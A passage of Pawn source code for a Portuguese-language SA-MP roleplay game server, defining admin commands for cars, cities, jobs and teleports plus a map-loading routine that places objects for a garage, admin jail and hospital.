    GetVehicleZAngle(cInfo[car][ID], angle);

	cInfo[car][Model] = id;
	cInfo[car][X] = cx;
	cInfo[car][Y] = cy;
	cInfo[car][Z] = cz;
	cInfo[car][Angle] = angle;

    DestroyVehicle(cInfo[car][ID]);
    
    IsARespawn[car] = true;
	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
	AtualizarDanosCarro(car);
	
	SetVehiclePos(cInfo[car][ID], cx, cy, cz);
	SetVehicleZAngle(cInfo[car][ID], angle);
	
	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
	
	GuardarCarro(car);

    format(string, sizeof(string), "Puseste o carro %d com o model %d", car, id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acarfaction(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acarfaction <faction>");
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

    new car = GetPlayerVehicleID(playerid);
    new string[128];
    
    cInfo[car][Faction] = id;
    cInfo[car][Type] = -2;
    GuardarCarro(car);

    format(string, sizeof(string), "Agora o carro %d pertence é faction %d", car, id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acartype(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
    new id, string[128];
    
    if(sscanf(params, "d", id))
	{
        SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acartype <type>");
        
        format(string, sizeof(string), "[Types]: {FFFFFF}-2: Faction -1: Pessoal - 0: Não configurado - {FFFFFF}50: Carta de Ligeiros - 51: Carta de Pesados", jInfo[1][ID], jInfo[1][Nome], jInfo[2][ID], jInfo[2][Nome], jInfo[3][ID], jInfo[3][Nome], jInfo[4][ID], jInfo[4][Nome], jInfo[5][ID], jInfo[5][Nome]);
        SendClientMessage(playerid, COLOR_CHAT, string);
        format(string, sizeof(string), "[Types]: {FFFFFF}52: Carta de Motociclos - 53: Carta de Barco", jInfo[1][ID], jInfo[1][Nome], jInfo[2][ID], jInfo[2][Nome], jInfo[3][ID], jInfo[3][Nome], jInfo[4][ID], jInfo[4][Nome], jInfo[5][ID], jInfo[5][Nome]);
        SendClientMessage(playerid, COLOR_CHAT, string);
        format(string, sizeof(string), "[Types]: {FFFFFF}%d: %s - %d: %s - %d: %s - %d: %s", jInfo[1][ID], jInfo[1][Nome], jInfo[2][ID], jInfo[2][Nome], jInfo[3][ID], jInfo[3][Nome], jInfo[4][ID], jInfo[4][Nome]);
		SendClientMessage(playerid, COLOR_CHAT, string);
        format(string, sizeof(string), "[Types]: {FFFFFF}%d: %s - %d: %s - %d: %s - %d: %s - %d - %s", jInfo[5][ID], jInfo[5][Nome], jInfo[6][ID], jInfo[6][Nome], jInfo[7][ID], jInfo[7][Nome], jInfo[8][ID], jInfo[8][Nome], jInfo[9][ID], jInfo[9][Nome]);
		SendClientMessage(playerid, COLOR_CHAT, string);

		return 1;
	}
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
    new car = GetPlayerVehicleID(playerid);
    
    cInfo[car][Type] = id;
    
    GuardarCarro(car);
    
    format(string, sizeof(string), "Alteraste o type do carro %d para %d", car, id);
    SendClientMessage(playerid, COLOR_INFO, string);
    
	return 1;
}

COMMAND:resetcarros(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new model, i, Float:distance = 6.0, Float:metres = distance, Float:a, vw, interior;
	
	vw = GetPlayerVirtualWorld(playerid);
	interior = GetPlayerInterior(playerid);

	for(; i < sizeof(cInfo); i++, metres += distance)
	{
 		if(i == 0) continue;
   		if(i == 1)
	    {
     		model = 404;
	    }
	    else
	    {
     		model = 510;
	    }

		GetPlayerPos(playerid, cInfo[i][X], cInfo[i][Y], cInfo[i][Z]);
		GetPlayerFacingAngle(playerid, a);
		
		cInfo[i][Model] = model;
		cInfo[i][Type] = 0;
		cInfo[i][X] += (metres * floatsin(-a, degrees));
		cInfo[i][Y] += (metres * floatcos(-a, degrees));
		cInfo[i][Angle] = a;
		cInfo[i][VirtualWorld] = vw;
		cInfo[i][Interior] = interior;
		
		cInfo[i][Color1] = 0;
		cInfo[i][Color2] = 0;
		cInfo[i][Faction] = 0;
		cInfo[i][Type] = 0;
		cInfo[i][Comprado] = 0;
		cInfo[i][Travao] = 0;
		cInfo[i][Kilometros] = 0;
		cInfo[i][Metros] = 0;
		cInfo[i][Neon] = 0;
		cInfo[i][NeonStatus] = 0;
		cInfo[i][Gasolina] = 100;
		cInfo[i][Vida] = 0;
		cInfo[i][mod1] = 0;
		cInfo[i][mod2] = 0;
		cInfo[i][mod3] = 0;
		cInfo[i][mod4] = 0;
		cInfo[i][mod5] = 0;
		cInfo[i][mod6] = 0;
		cInfo[i][mod7] = 0;
		cInfo[i][mod8] = 0;
		cInfo[i][mod9] = 0;
		cInfo[i][mod10] = 0;
		cInfo[i][mod11] = 0;
		cInfo[i][Apreendido] = 0;
		cInfo[i][Arma1] = 0;
		cInfo[i][Ammo1] = 0;
		cInfo[i][Arma2] = 0;
		cInfo[i][Ammo2] = 0;
		cInfo[i][Arma3] = 0;
		cInfo[i][Ammo3] = 0;
		cInfo[i][RadioStatus] = 0;
		cInfo[i][IsCaravana] = 0;
		cInfo[i][CaravanaCasaID] = 0;
		
		DestroyVehicle(cInfo[i][ID]);
		
		IsARespawn[i] = true;
		cInfo[i][ID] = CreateVehicle(cInfo[i][Model], cInfo[i][X], cInfo[i][Y], cInfo[i][Z], cInfo[i][Angle], cInfo[i][Color1], cInfo[i][Color2], -1, IsACopCar(cInfo[i][Model]) ? 1 : 0);
		SetVehicleVirtualWorld(cInfo[i][ID], cInfo[i][VirtualWorld]);
		LinkVehicleToInterior(cInfo[i][ID], cInfo[i][Interior]);
		AtualizarDanosCarro(i);
	}
	MatriculasAtualizar();
	GuardarCarros();
	
    SendClientMessage(playerid, COLOR_INFO, "Deste reset a todos os carros do servidor");
    
    return 1;
}

COMMAND:acidadecmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de CIDADES:] {FFFFFF}/acidadespawn - /acidadenome");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:acidadespawn(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acidadespawn <cidade>");
    if(id < 0 || id > (MAX_CIDADES-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Cidade inválida.");
    
    new Float:x, Float:y, Float:z, Float:a, pInterior, pVirtualWorld, string[128];
    
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);
	pInterior = GetPlayerInterior(playerid);
	pVirtualWorld = GetPlayerVirtualWorld(playerid);
    
    SpawnInfo[id][X] = x;
    SpawnInfo[id][Y] = y;
    SpawnInfo[id][Z] = z;
    SpawnInfo[id][A] = a;
    SpawnInfo[id][Interior] = pInterior;
    SpawnInfo[id][VirtualWorld] = pVirtualWorld;
    
    GuardarCidade(id);

    format(string, sizeof(string), "Alteraste o spawn da cidade %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);
    
    return 1;
}

COMMAND:acidadenome(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[16];

    if(sscanf(params, "ds[16]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/acidadenome <id> <nome da cidade>");
    if(id < 0 || id > (MAX_CIDADES-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Cidade inválida.");

    new string[128];

	format(SpawnInfo[id][Nome], 32, "%s", nome);
	GuardarCidade(id);

    format(string, sizeof(string), "Alteraste o nome da cidade %d para %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajobcmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de JOB:] {FFFFFF}/ajobname - /ajobsalario - /ajobrotasalario - /ajoblic - /ajobinfo");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de JOB:] {FFFFFF}/ajobdespedir - /ajobserotas - /ajobsetlevel");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    
    return 1;
}

COMMAND:ajobsetlevel(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, level, string[64];

    if(sscanf(params, "dd", giveplayerid, level)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobsetlevel <playerid> <nível>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(level <= 0 || level > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível inválido.");

	format(string, sizeof(string), "Setaste %d nível de job no jogador %s.", level, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s setou o teu nível de job para %d.", GetPlayerNameEx(playerid), level);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][EmpregoNivel] = level;
	pInfo[giveplayerid][Rotas] = 0;

	return 1;
}

COMMAND:ajobserotas(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, rotas, string[64];

    if(sscanf(params, "dd", giveplayerid, rotas)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobserotas <playerid> <rotas>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	format(string, sizeof(string), "Setaste %d rotas no jogador %s.", rotas, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s setou as tuas rotas para %d.", GetPlayerNameEx(playerid), rotas);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][Rotas] = rotas;

	return 1;
}

COMMAND:ajobdespedir(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[64];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobdespedir <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	format(string, sizeof(string), "Retiraste o jogador %s do emprego.", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s tirou-te do emprego.", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][Emprego] = 0;

	return 1;
}

COMMAND:ajobinfo(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new job, string[256];

    if(sscanf(params, "d", job)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobinfo <id>");
    if(job <= 0 || job > (MAX_JOBS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido");
    
    new lic[16];
    
	if(jInfo[job][Ligeiros] == 1)
	{
	    lic = "Ligeiros";
	}
	else if(jInfo[job][Pesados] == 1)
	{
	    lic = "Pesados";
	}
	else if(jInfo[job][Motociclos] == 1)
	{
        lic = "Motociclos";
	}
	else if(jInfo[job][Barco] == 1)
	{
        lic = "Barco";
	}
	else
	{
        lic = "Não Configurado";
	}
	
    format(string, sizeof(string), "{FF9900}Job: %s - Salário: %d$ - Salário por Rota: %d$ - Licença: %s", jInfo[job][Nome], jInfo[job][Salario], jInfo[job][RotaSalario], lic);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajoblic(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, carta;

    if(sscanf(params, "dd", id, carta))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajoblic <id> <carta>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Tipos de carta]: {FFFFFF}0: Ligeiros - 1: Pesados - 2: Motociclos - 3: Barco");
	    
	    return 1;
	}

    if(id < 1 || id > (MAX_JOBS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido.");
	if(carta < 0 || carta > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Salário inválido.");

    new string[128];

	switch(carta)
	{
	    case 0:
	    {
			jInfo[id][Ligeiros] = 1;
			jInfo[id][Pesados] = 0;
			jInfo[id][Motociclos] = 0;
			jInfo[id][Barco] = 0;
			
			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Ligeiros", id);
	    }
	    case 1:
	    {
			jInfo[id][Ligeiros] = 0;
			jInfo[id][Pesados] = 1;
			jInfo[id][Motociclos] = 0;
			jInfo[id][Barco] = 0;
			
			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Pesados", id);
	    }
	    case 2:
		{
			jInfo[id][Ligeiros] = 0;
			jInfo[id][Pesados] = 0;
			jInfo[id][Motociclos] = 1;
			jInfo[id][Barco] = 0;
			
			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Motociclos", id);
		}
		case 3:
		{
			jInfo[id][Ligeiros] = 0;
			jInfo[id][Pesados] = 0;
			jInfo[id][Motociclos] = 0;
			jInfo[id][Barco] = 1;
			
			format(string, sizeof(string), "O requerimento para trabalhar no job %d é ter carta de Barco", id);
		}
	}
	GuardarJob(id);

    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajobname(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    
    new id, nome[32];
    
    if(sscanf(params, "ds[32]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobname <id> <nome do job>");
    if(id < 1 || id > (MAX_JOBS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido.");
    
    new string[128];
	
	format(jInfo[id][Nome], 32, "%s", nome);
	GuardarJob(id);
    
    format(string, sizeof(string), "Alteraste o nome do job %d para %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajobsalario(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, salario;

    if(sscanf(params, "dd", id, salario)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobsalario <id> <salário>");
    if(id < 1 || id > (MAX_JOBS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido.");
	if(salario < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Salário inválido.");

    new string[128];

	jInfo[id][Salario] = salario;
	GuardarJob(id);

    format(string, sizeof(string), "Alteraste o Salário do job %d para %d$", id, salario);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:ajobrotasalario(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, salario;

    if(sscanf(params, "dd", id, salario)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajobrotasalario <id> <Salário>");
    if(id < 1 || id > (MAX_JOBS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Job inválido.");
	if(salario < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Salário inválido.");

    new string[128];

	jInfo[id][RotaSalario] = salario;
	GuardarJob(id);

    format(string, sizeof(string), "Alteraste o Salário por rota do job %d para %d$", id, salario);
    SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:gotopesca(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 574, -2510, 2.7);
	}
	else
	{
		SetPlayerPosEx(playerid, 574, -2510, 2.7);
	}
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotolv(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 1699.2, 1435.1, 10.7);
	}
	else
	{
		SetPlayerPosEx(playerid, 1699.2,1435.1, 10.7);
	}
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotodm(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 713.9617, -565.1425, 16.0630);
	}
	else
	{
		SetPlayerPosEx(playerid, 713.9617, -565.1425, 16.0630);
	}
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotomg(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 1319.1113, 297.8485, 19.2818);
	}
	else
	{
		SetPlayerPosEx(playerid, 1319.1113, 297.8485, 19.2818);
	}
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotopc(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 2200.0015, 52.0060, 26.2100);
	}
	else
	{
		SetPlayerPosEx(playerid, 2200.0015, 52.0060, 26.2100);
	}
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotofc(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, -285.3123,1088.4076,19.7422);
	}
	else
	{
		SetPlayerPosEx(playerid, -285.3123,1088.4076,19.7422);
	}
	
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotolb(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, -794.8752,1557.0309,27.1506);
	}
	else
	{
		SetPlayerPosEx(playerid, -794.8752,1557.0309,27.1506);
	}
	
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotosf(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, -1417.0,-295.8,14.1);
	}
	else
	{
		SetPlayerPosEx(playerid, -1417.0,-295.8,14.1);
	}

	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotols(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 1473.4165,-1697.8749,14.0469);
	}
	else
	{
		SetPlayerPosEx(playerid, 1473.4165,-1697.8749,14.0469);
	}

	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotolsa(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, 1757.0024,-2538.3718,14.5153);
	}
	else
	{
		SetPlayerPosEx(playerid, 1757.0024,-2538.3718,14.5153);
	}

	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

COMMAND:gotolp(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePosEx(tmpcar, -249.6600,2693.1934,62.6836);
	}
	else
	{
		SetPlayerPosEx(playerid, -249.6600,2693.1934,62.6836);
	}
	
	SetPlayerInterior(playerid,0);
	SetPlayerVirtualWorld(playerid,0);

    return 1;
}

// ------------------------------ MAPAS


public CarregarMapasRemove(playerid)
{
	return 1;
}

public CarregarMapas()
{
	new tick1;
	new tick2;

	tick1 = GetTickCount();
	
	// ---------------------------- FIXES ----------------------------

	/* PAY N SPRAY */
	CreateDynamicObject(2957, 488.22678, -1734.67114, 11.32132,   0.00000, 0.00000, 350.34702);
	CreateDynamicObject(2957, 488.22678, -1734.67114, 13.07919,   0.00000, 0.00000, 350.76337);

	// ---------------------------- ADMIN JAIL ----------------------------

	CreateDynamicObject(6959, 184.20139, -2756.70581, -2.81972,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(6959, 166.51990, -2756.04614, 1.55490,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(6959, 180.70590, -2764.79150, 1.55490,   0.00000, -90.00000, 93.00000);
	CreateDynamicObject(6959, 180.02966, -2739.07813, 1.55490,   0.00000, -90.00000, 88.20010);
	CreateDynamicObject(6959, 198.23430, -2751.36938, 1.55490,   0.00000, -90.00000, 0.00000);
	
	// ---------------------------- PORTÕES ---------------------------------
	
 	/*	GARAGEM PSP */
	CreateDynamicObject(2928, 1582.91345, -1637.87366, 13.62220,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1582.87415, -1637.99963, 16.33711,   0.00000, 0.00000, 89.99034);
	pspgaragem1 = CreateDynamicObject(2957, 1590.41174, -1638.20911, 13.91207,   0.00000, 0.00000, 360.14096);
	pspgaragem2 = CreateDynamicObject(2957, 1585.94800, -1638.11829, 13.84867,   0.00000, 0.00000, 360.14096);
	
	pspentrada1 = CreateDynamicObjectEx(1495, 1560.11401, -1683.49597, 1100.06995,   0.00000, 0.00000, 0.00000); // porta psp entrada (x aberta: 1558.60876) 1558.60876, -1683.49597, 1100.06995
	pspentrada2 = CreateDynamicObjectEx(1495, 1561.62024, -1667.60498, 1100.06995,   0.00000, 0.00000, 180.00000); // porta psp entrada (x aberta: 1563.14172) 1563.14172, -1667.60498, 1100.06995
	
	srgaragem1_1 = CreateDynamicObject(19456, 327.46304, -1479.92493, 29.11834,   0.00000, 0.00000, 53.91243);
	srgaragem1_2 = CreateDynamicObject(19456, 327.46304, -1479.92493, 25.71881,   0.00000, 0.00000, 53.91243); // 22.55216
	
	srgaragem2_1 = CreateDynamicObject(19456, 280.22620, -1548.16333, 29.65302,   0.00000, 0.00000, 67.38001);
	srgaragem2_2 = CreateDynamicObject(19456, 280.20914, -1548.15283, 26.24194,   0.00000, 0.00000, 67.38001); // 22.32809

	// ---------------------------- HOSPITAl 3 ------------------------------
	
	CreateDynamicObject(14858, 1158.02209, -2523.12891, 117.96269,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1538, 1145.07642, -2509.38159, 112.82207,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1538, 1145.05994, -2512.38306, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1141.66785, -2514.47778, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1142.31885, -2514.47778, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1142.97473, -2514.47778, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1143.60413, -2514.47778, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1144.25732, -2514.47778, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1144.95496, -2508.81689, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1144.95496, -2508.01758, 112.82207,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1143.77063, -2506.81348, 112.82207,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1143.09558, -2506.81348, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1721, 1142.44409, -2506.81348, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1999, 1126.71814, -2508.05176, 112.82207,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1999, 1130.02319, -2502.95166, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(646, 1144.47803, -2507.12817, 114.23859,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(1491, 1134.81860, -2547.51172, 112.81425,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1523, 1122.96753, -2510.58057, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1133.36426, -2514.89648, 112.81557,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1124.80371, -2514.89648, 112.81425,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1136.58691, -2524.82935, 112.81557,   0.00000, 0.00000, 269.75000);
	CreateDynamicObject(2200, 1126.06360, -2531.34473, 112.81557,   0.00000, 0.00000, 179.74731);
	CreateDynamicObject(2204, 1126.29639, -2546.94922, 112.81425,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14867, 1131.85400, -2543.37354, 114.33720,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2382, 1135.14563, -2540.44849, 113.48050,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2386, 1131.89197, -2545.40186, 115.98447,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2371, 1134.84277, -2540.05786, 112.81425,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2394, 1135.44678, -2539.75781, 113.52165,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2704, 1135.64734, -2540.44458, 113.51526,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2844, 1131.11963, -2541.63574, 115.88808,   0.00000, 0.00000, 330.00000);
	CreateDynamicObject(2846, 1135.06335, -2540.73535, 112.81425,   0.00000, 0.00000, 32.00000);
	CreateDynamicObject(2689, 1135.78345, -2540.43359, 113.51421,   0.00000, 0.00000, 86.00000);
	CreateDynamicObject(1569, 1130.96594, -2510.59082, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1569, 1134.80261, -2547.50610, 112.81425,   0.00000, 0.00000, 359.99451);
	CreateDynamicObject(1569, 1130.96436, -2510.56592, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1569, 1123.00049, -2510.56787, 112.82207,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1569, 1124.48694, -2510.56665, 112.82207,   0.00000, 0.00000, 359.99451);
	CreateDynamicObject(1808, 1141.57520, -2506.85059, 112.82207,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2263, 1140.55664, -2507.17529, 114.57063,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2008, 1140.12695, -2508.06714, 112.82207,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2008, 1140.14807, -2506.15894, 112.82207,   0.00000, 0.00000, 269.25000);
